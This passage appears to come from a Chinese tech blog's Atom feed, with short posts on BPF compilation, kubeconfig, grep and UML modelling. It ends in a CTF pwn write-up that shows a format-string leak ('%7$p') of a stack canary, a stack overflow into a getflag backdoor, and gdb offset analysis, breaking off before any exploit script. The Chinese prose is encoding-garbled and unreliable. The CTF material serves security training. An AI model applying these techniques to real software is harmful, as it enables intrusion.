    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-147-generic <span class="hljs-comment">#164~18.04.1-Ubuntu SMP Tue Apr 4 00:20:20 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br><span class="hljs-comment"># cat /etc/os-release</span><br>NAME=<span class="hljs-string">&quot;Ubuntu&quot;</span><br>VERSION=<span class="hljs-string">&quot;18.04.6 LTS (Bionic Beaver)&quot;</span><br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=<span class="hljs-string">&quot;Ubuntu 18.04.6 LTS&quot;</span><br>VERSION_ID=<span class="hljs-string">&quot;18.04&quot;</span><br>HOME_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/&quot;</span><br>SUPPORT_URL=<span class="hljs-string">&quot;https://help.ubuntu.com/&quot;</span><br>BUG_REPORT_URL=<span class="hljs-string">&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br>PRIVACY_POLICY_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br>VERSION_CODENAME=bionic<br>UBUNTU_CODENAME=bionic<br><br></code></pre></td></tr></table></figure><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># clang -O2 -g -target bpf -c bpf_sockops.c -o bpf_sockops.o</span><br>In file included from bpf_sockops.c:1:<br>In file included from /usr/include/linux/bpf.h:11:<br>/usr/include/linux/types.h:5:10: fatal error: <span class="hljs-string">&#x27;asm/types.h&#x27;</span> file not found<br><span class="hljs-comment">#include &lt;asm/types.h&gt;</span><br>         ^~~~~~~~~~~~~<br>1 error generated.<br><br></code></pre></td></tr></table></figure><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># apt-get install -y gcc-multilib</span><br></code></pre></td></tr></table></figure><h2 id="å‚å¡"><a href="#å‚å¡" class="headerlink" title="å‚å¡"></a>å‚å¡</h2><p><a href="https://www.ghl.name/archives/how-to-fix-asm-types-h-no-found.html"># Debianä¸‹libbpfç¼–è¯‘å¤±è´¥æç¤º&lt;asm&#x2F;types.h&gt;æ–‡ä»¶ä¸å­˜åœ¨è§£å†³æ–¹æ³•</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘todo(202305) kubeconfigæ–‡ä»¶</title>
    <link href="/2023/10/31/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91todo(202305)%20kubeconfig%E6%96%87%E4%BB%B6/"/>
    <url>/2023/10/31/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91todo(202305)%20kubeconfig%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>åœ¨Kubernetesä¸­ï¼Œkubeconfigæ˜¯ç”¨äºæŒ‡å®šå¦‚ä½•è¿æ¥åˆ°Kubernetesé›†ç¾¤çš„é…ç½®æ–‡ä»¶ã€‚kubeconfigåŒ…å«äº†ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ol><li>Kubernetes APIæœåŠ¡å™¨çš„åœ°å€å’Œè®¿é—®å‡­æ®ï¼ˆç”¨æˆ·åå’Œå¯†ç ã€å®¢æˆ·ç«¯è¯ä¹¦å’Œç§é’¥ç­‰ï¼‰ã€‚</li><li>ç”¨äºæˆæƒè®¿é—®Kubernetes APIçš„å‡­æ®ï¼ˆä¾‹å¦‚ï¼ŒTokenã€BasicAuthç­‰ï¼‰ã€‚</li><li>Kubernetesé›†ç¾¤çš„CAï¼ˆè¯ä¹¦é¢å‘æœºæ„ï¼‰è¯ä¹¦ï¼Œç”¨äºéªŒè¯APIæœåŠ¡å™¨çš„TLSè¯ä¹¦ã€‚</li></ol><p>kubeconfigä¸­çš„è¯ä¹¦åŒ…æ‹¬å®¢æˆ·ç«¯è¯ä¹¦å’ŒCAè¯ä¹¦ã€‚å®¢æˆ·ç«¯è¯ä¹¦ç”¨äºå¯¹ä¸Kubernetes APIæœåŠ¡å™¨çš„é€šä¿¡è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå®ƒé€šå¸¸ç”±CAè¯ä¹¦ç­¾å‘ã€‚CAè¯ä¹¦ç”¨äºéªŒè¯Kubernetes APIæœåŠ¡å™¨çš„TLSè¯ä¹¦ï¼Œä»¥ç¡®ä¿ä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡æ˜¯å®‰å…¨çš„ã€‚åœ¨kubeconfigä¸­é…ç½®æ­£ç¡®çš„å®¢æˆ·ç«¯è¯ä¹¦å’ŒCAè¯ä¹¦å¯ä»¥ç¡®ä¿ä¸Kubernetes APIæœåŠ¡å™¨çš„è¿æ¥æ˜¯å®‰å…¨çš„ï¼Œå¹¶ä¸”åªæœ‰æˆæƒç”¨æˆ·æ‰èƒ½è®¿é—®é›†ç¾¤èµ„æºã€‚</p><p>Kubernetesä½¿ç”¨TLSæ¥ä¿æŠ¤APIæœåŠ¡å™¨å’Œå„ä¸ªç»„ä»¶ä¹‹é—´çš„é€šä¿¡ã€‚å®¢æˆ·ç«¯è¯ä¹¦å’ŒCAè¯ä¹¦éƒ½æ˜¯X.509æ ¼å¼çš„æ•°å­—è¯ä¹¦ï¼Œç”¨äºéªŒè¯å’ŒåŠ å¯†è¿™äº›é€šä¿¡ã€‚å› æ­¤ï¼Œåœ¨kubeconfigä¸­æ­£ç¡®é…ç½®è¿™äº›è¯ä¹¦æ˜¯ç¡®ä¿Kubernetesé›†ç¾¤å®‰å…¨æ€§çš„å…³é”®ä¹‹ä¸€ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202307) å¸¸ç”¨å‘½ä»¤ï¼šgrep</title>
    <link href="/2023/10/31/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Agrep/"/>
    <url>/2023/10/31/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Agrep/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># grepå¦‚ä½•æŸ¥æ‰¾ä¸¤ä¸ªå­—ç¬¦ä¸²</span><br><span class="hljs-built_in">cat</span> <span class="hljs-string">&quot;xxxx&quot;</span> | grep -E <span class="hljs-string">&quot;thb7r|6rgl8&quot;</span><br><br><br><span class="hljs-comment"># grep å¦‚ä½•è·å–ä»¥aaaå¼€å¤´çš„å­—ç¬¦ä¸²</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;aaa123\nbbb456\n789aaa\naaa789\nccc012&quot;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;aaa123\nbbb456\n789aaa\naaa789\nccc012&quot;</span> | grep <span class="hljs-string">&quot;^aaa&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202307)å¸¸ç”¨å‘½ä»¤ï¼šdoc2unix</title>
    <link href="/2023/10/31/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Adoc2unix/"/>
    <url>/2023/10/31/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Adoc2unix/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€EnterpriseArchitectã€‘å°æ¡ˆä¾‹-å›¾ä¹¦ç®¡ç†ç³»ç»Ÿ</title>
    <link href="/2023/09/20/tools/%E3%80%90EnterpriseArchitect%E3%80%91%E5%B0%8F%E6%A1%88%E4%BE%8B-%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/09/20/tools/%E3%80%90EnterpriseArchitect%E3%80%91%E5%B0%8F%E6%A1%88%E4%BE%8B-%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="ç”¨ä¾‹å›¾"><a href="#ç”¨ä¾‹å›¾" class="headerlink" title="ç”¨ä¾‹å›¾"></a>ç”¨ä¾‹å›¾</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920094652.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920094737.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920094757.png" alt="image.png"></p><p>å¯ä»¥å‘ç°ï¼Œæœ‰ç®­å¤´äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920095218.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920095642.png" alt="image.png"></p><h2 id="æ´»åŠ¨å›¾"><a href="#æ´»åŠ¨å›¾" class="headerlink" title="æ´»åŠ¨å›¾"></a>æ´»åŠ¨å›¾</h2><p>å¯ä»¥åœ¨è¿™ä¸ªåœ°æ–¹çš„å€Ÿä¹¦ç›´æ¥å»ºå›¾ï¼Œä¹Ÿå¯ä»¥å’Œä¸šåŠ¡å»ºæ¨¡å¹³è¡Œå»ºç«‹ä¸€ä¸ªéœ€æ±‚å»ºæ¨¡ï¼Œä¸‹é¢ä¸ºç¬¬ä¸€ç§æ–¹å¼</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920095907.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920095954.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920101848.png" alt="image.png"></p><h2 id="åˆ†æå»ºæ¨¡"><a href="#åˆ†æå»ºæ¨¡" class="headerlink" title="åˆ†æå»ºæ¨¡"></a>åˆ†æå»ºæ¨¡</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920102652.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920103253.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920103351.png" alt="image.png"></p><h2 id="è®¾è®¡å»ºæ¨¡"><a href="#è®¾è®¡å»ºæ¨¡" class="headerlink" title="è®¾è®¡å»ºæ¨¡"></a>è®¾è®¡å»ºæ¨¡</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920104716.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920104829.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920104918.png" alt="image.png"></p><p>é€‰æ‹©â€œPackageâ€<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920105147.png" alt="image.png"></p><p>ä¾èµ–å…³ç³»ï¼Œä¸€èˆ¬è¡¨ç°ä¸ºä¼ å‚</p><h2 id="ç»„åˆç»“æ„å›¾"><a href="#ç»„åˆç»“æ„å›¾" class="headerlink" title="ç»„åˆç»“æ„å›¾"></a>ç»„åˆç»“æ„å›¾</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920110246.png" alt="image.png"></p><p>æ‹–ä¸€ä¸ªç®¡ç†å‘˜è¿›æ¥</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920111027.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920111127.png" alt="image.png"></p><h2 id="é¡ºåºå›¾"><a href="#é¡ºåºå›¾" class="headerlink" title="é¡ºåºå›¾"></a>é¡ºåºå›¾</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920112154.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920112249.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920114143.png" alt="image.png"></p><p>å˜æˆè¿™æ ·å­äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920114203.png" alt="image.png"></p><p>ä¸‹é¢è¿™ä¸ªåœˆä½çš„æ„æ€æ˜¯ï¼šå½“æ»¡è¶³æ¡ä»¶æ—¶ï¼Œè°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œåˆ›å»ºåé¢é‚£ä¸ªå¯¹è±¡<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920115308.png" alt="image.png"></p><h2 id="é€šä¿¡å›¾"><a href="#é€šä¿¡å›¾" class="headerlink" title="é€šä¿¡å›¾"></a>é€šä¿¡å›¾</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920141543.png" alt="image.png"></p><h2 id="éƒ¨ç½²å›¾"><a href="#éƒ¨ç½²å›¾" class="headerlink" title="éƒ¨ç½²å›¾"></a>éƒ¨ç½²å›¾</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920145216.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920145511.png" alt="image.png"></p><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920172008.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfé¢˜ç›®ç³»åˆ—ã€‘pwnç±»å‹ canary</title>
    <link href="/2023/09/04/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91pwn%E7%B1%BB%E5%9E%8B%20canary/"/>
    <url>/2023/09/04/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91pwn%E7%B1%BB%E5%9E%8B%20canary/</url>
    
    <content type="html"><![CDATA[<h1 id="01-æ ¼å¼åŒ–å­—ç¬¦ä¸²-32ä½ç¨‹åº"><a href="#01-æ ¼å¼åŒ–å­—ç¬¦ä¸²-32ä½ç¨‹åº" class="headerlink" title="01 æ ¼å¼åŒ–å­—ç¬¦ä¸² (32ä½ç¨‹åº)"></a>01 æ ¼å¼åŒ–å­—ç¬¦ä¸² (32ä½ç¨‹åº)</h1><h2 id="checksecæŸ¥çœ‹"><a href="#checksecæŸ¥çœ‹" class="headerlink" title="checksecæŸ¥çœ‹"></a>checksecæŸ¥çœ‹</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/01]<br>â””â”€<span class="hljs-comment"># file bin</span><br>bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=01c7b75be8e31b585bf8739665273c91584b826e, not stripped<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/01]<br>â””â”€<span class="hljs-comment"># checksec --file=bin</span><br>[*] <span class="hljs-string">&#x27;/root/ctf-practice/canary/01/bin&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/01]<br>â””â”€<span class="hljs-comment"># ./bin</span><br>%7<span class="hljs-variable">$p</span><br>0xda44e500123456<br><br></code></pre></td></tr></table></figure><p>checksecæŸ¥çœ‹å‘ç°ï¼š32ä½ç¨‹åºï¼Œæœ‰canary</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904220846.png" alt="image.png"></p><h2 id="åˆ†ææ¼æ´å‡½æ•°"><a href="#åˆ†ææ¼æ´å‡½æ•°" class="headerlink" title="åˆ†ææ¼æ´å‡½æ•°"></a>åˆ†ææ¼æ´å‡½æ•°</h2><p>ä»idaä¸­æŸ¥çœ‹ï¼Œåˆ†ææ¼æ´å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+6h] [ebp-12h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  init();<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  fun();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°ä¸Šé¢çš„mainå‡½æ•°ä¸­å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ³„éœ²å‡ºcanaryçš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>funå‡½æ•°ä¸­ï¼Œæœ‰ä¸€ä¸ªæ ˆæº¢å‡ºçš„æ¼æ´ï¼Œå¯ä»¥æ„é€ payloadè¿›è¡Œæ ˆæº¢å‡ºï¼Œè¿”å›åœ°å€å¡«å……æˆä»€ä¹ˆå‘¢ï¼Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getflag</span><span class="hljs-params">()</span><br>&#123;<br>  FILE *stream; <span class="hljs-comment">// [esp+4h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  stream = fopen(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;get flag error&quot;</span>);<br>  fgets(s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹çœ‹åˆ°æœ‰ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œç›´æ¥è¿”å›åˆ°è¿™ä¸ªå‡½æ•°ä½ç½®å³å¯~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221307.png" alt="image.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; =============== S U B R O U T I N E =======================================<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; Attributes: bp-based frame<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; unsigned <span class="hljs-type">int</span> getflag()<br>.text:<span class="hljs-number">0804863</span>B                               <span class="hljs-built_in">public</span> getflag<br>.text:<span class="hljs-number">0804863</span>B                               getflag proc near<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               stream= dword ptr <span class="hljs-number">-74</span>h<br>.text:<span class="hljs-number">0804863</span>B                               s= byte ptr <span class="hljs-number">-70</span>h<br>.text:<span class="hljs-number">0804863</span>B                               var_C= dword ptr <span class="hljs-number">-0</span>Ch<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; __unwind &#123;<br>.text:<span class="hljs-number">0804863</span>B <span class="hljs-number">55</span>                            push    ebp<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°åé—¨å‡½æ•°ä¸ºcat .&#x2F;flagï¼Œæ‰€ä»¥åœ¨åŒçº§ç›®å½•ä¸‹åŠ ä¸ªä¸€ä¸ªflagæ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/01]<br>â””â”€<span class="hljs-comment"># cat flag</span><br>flag123<br></code></pre></td></tr></table></figure><h2 id="å¦‚ä½•æ³„éœ²canaryåœ°å€-å¦‚ä½•å¯»æ‰¾å˜é‡å’Œebpä¹‹é—´çš„åç§»"><a href="#å¦‚ä½•æ³„éœ²canaryåœ°å€-å¦‚ä½•å¯»æ‰¾å˜é‡å’Œebpä¹‹é—´çš„åç§»" class="headerlink" title="å¦‚ä½•æ³„éœ²canaryåœ°å€ + å¦‚ä½•å¯»æ‰¾å˜é‡å’Œebpä¹‹é—´çš„åç§»"></a>å¦‚ä½•æ³„éœ²canaryåœ°å€ + å¦‚ä½•å¯»æ‰¾å˜é‡å’Œebpä¹‹é—´çš„åç§»</h2><p>å…ˆåˆ†æä¸€ä¸‹æºä»£ç </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># gdb bin</span><br>pwndbg&gt; <span class="hljs-keyword">b </span>main<br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">1</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x8048739</span><br>pwndbg&gt; r<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221703.png" alt="image.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x804873c</span> &lt;main+<span class="hljs-number">17</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">gs</span>:[<span class="hljs-number">0x14</span>]<br><span class="hljs-number">0x8048742</span> &lt;main+<span class="hljs-number">23</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span> - <span class="hljs-number">0xc</span>], <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸¤è¡Œå°±æ˜¯å’Œcanaryç›¸å…³çš„æ±‡ç¼–ä»£ç </p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">pwndbg&gt; <span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œå®Œ <code>0x804873c &lt;main+17&gt;    mov    eax, dword ptr gs:[0x14]</code>ä¹‹åï¼Œeaxä¸­å­˜å…¥çš„å³ä¸ºcanaryçš„å€¼ï¼Œä¸º0x888b8f00 (æ³¨æ„ï¼Œæ¯æ¬¡è¿è¡Œcanaryçš„å€¼éƒ½ä¼šå˜)ï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221849.png" alt="image.png"></p><p>è¿è¡Œå®Œ<code>0x8048742 &lt;main+23&gt;    mov    dword ptr [ebp - 0xc], eax</code>ï¼Œcanaryçš„å€¼è¢«å­˜å…¥åˆ°<code>ebp-0xc</code>çš„ä½ç½®ï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904222140.png" alt="image.png"></p><p>ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹ï¼ŒæŠŠä¼ªä»£ç å†ç²˜è´´ä¸€ä»½è¿‡æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+6h] [ebp-12h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+Ch] 